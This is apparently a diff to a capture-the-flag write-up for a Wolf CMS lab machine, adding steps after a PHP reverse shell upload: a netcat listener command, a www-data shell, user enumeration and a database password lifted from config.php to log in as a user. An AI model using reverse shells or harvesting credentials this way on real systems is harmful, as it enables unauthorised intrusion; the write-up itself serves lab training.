@@ -71,6 +71,25 @@ $ip = '192.168.100.5';
 $port = 1234;
 ```
 
+The uploaded file can be executed using following path: `http://127.0.0.1/wolfcms/public/`
+
 ```bash
 nc -nlvp 1234  
 ```
+
+### Here we got the reverse shell and we are logged in as www-data
+![reverse shell executed](screenshots/shell.png)
+
+After Enumartion in /home I got the user `sickos`, now I need to get its password
+
+In the README.md file I got the following hint:
+![database hint](screenshots/hint.png)
+
+So as per the hint, we have to get the dbconnect file which will has password
+
+I got the config.php and we have a database connection along with password lets try that password:
+![db connect password](screenshots/hint2.png)
+
+### We got the user sicoks access on the target machine
+![sicos login](screenshots/access.png)
+
